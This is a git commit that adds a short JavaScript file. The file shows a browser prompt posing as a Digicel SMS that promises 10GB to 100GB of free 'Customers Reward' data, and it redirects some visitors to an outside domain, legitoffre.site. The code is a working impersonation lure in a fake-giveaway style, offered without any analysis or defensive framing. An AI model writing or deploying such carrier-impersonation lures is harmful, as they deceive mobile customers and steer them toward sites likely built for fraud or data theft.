b245f2182d895aeb0634d5df73c7c665eb822a85
legitipz <gloliousam4@gmail.com>
2025-12-26 06:14:55 -0800

    Create activation-digicelxmasdata.js

---
+++ activation-digicelxmasdata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('DIGICEL SMS: Dear Customer, Kindly Check If your Digicel Sim Card Is Qualify To Receive From 10GB To 100GB data, Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://legitoffre.site/digicelxmasdata.html';
+}
